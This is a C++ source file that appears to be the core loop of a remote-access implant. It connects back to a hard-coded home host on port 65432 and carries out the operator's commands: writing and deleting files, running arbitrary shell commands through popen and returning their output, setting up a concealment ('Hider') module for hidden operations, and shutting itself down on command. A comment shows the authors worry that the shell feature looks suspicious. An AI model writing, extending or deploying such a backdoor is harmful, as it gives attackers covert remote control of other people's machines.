#include <iostream>
#include <array>
#include <memory>

#include "SoftwareManeger.h"
#include "../IncludeCPP/Status.h"
#include "FunCodes.h"
#include "HiderManeger.h"
#include "../Hider/HiderCodes.h"
#include "Listener.h"
#include "Connection.h"
#include "../IncludeCPP/globalDefines.h"

#define PORT (65432)

void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
void testSoftwareManeger(void);

int main() {
    
    SoftwareManeger swm = SoftwareManeger();
    HiderManeger& hiderManager = HiderManeger::getInstance();
    std::shared_ptr<Connection> conn;
    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
        exit(EXIT_FAILURE);
    }


    bool cont = true;
    while (cont)
    {
        loopIter(conn, swm, hiderManager);
        std::cout << "compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}




std::string execBash(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    pclose(pipe);
    return result;
}


void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
{
    // receive command
    Status res = DID_NOTHING;
    command cmd;

    conn->recvCommand(cmd);
    std::string strParam = cmd.strParam;

    std::cout << "Server: fncode- " << cmd.fncode << "\nstrParam-" << strParam << std::endl;
    std::string strRes = "";
    switch (cmd.fncode)
    {
    case WRITE_FILE:
        // std::cout << "start write_file\n";
        res = swm.fileWrite(conn, cmd.dataLen, strParam);
        // std::cout << "finnish write_file\n";
        break;

    case DELETE_FILE:
        res = swm.deleteFile(strParam);
        break;

    case RUN_BASH:
        strRes = execBash(strParam.c_str()); // maybe we shoud abandon this option, it might be SUS
        res = SUCCSESS;
        break;

    case HIDER_SETUP:
        res = hiderManeger.setUpHider(strParam);
        break;
    
    case SUICIDE:
        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
        std::exit(EXIT_SUCCESS);
    
    }
    // hidden handling
    if (cmd.fncode & HIDDEN_OPRATION && cmd.fncode < (HIDDEN_OPRATION << 1)) {
        res = hiderManeger.hiddenAction(cmd, conn);
    }
    
    // TODO change such that there will be response only if we want it to be 
    std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
    conn->sendResponce(res, strRes);
}
